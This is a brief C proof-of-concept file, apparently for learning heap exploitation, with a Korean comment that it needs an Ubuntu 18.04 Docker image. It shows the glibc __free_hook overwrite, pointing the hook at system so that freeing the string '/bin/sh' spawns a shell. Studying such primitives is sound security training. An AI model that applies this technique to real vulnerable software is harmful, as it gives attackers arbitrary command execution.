// Name: fho-poc.c
// Compile: gcc -o fho-poc fho-poc.c

// Dockerfile로 18.04 버전 띄워야 가능
#include <malloc.h>
#include <stdlib.h>
#include <string.h>

const char *buf="/bin/sh";

int main() {
  printf("\"__free_hook\" now points at \"system\"\n");
  __free_hook = (void *)system;
  printf("call free(\"/bin/sh\")\n");
  free(buf);
}
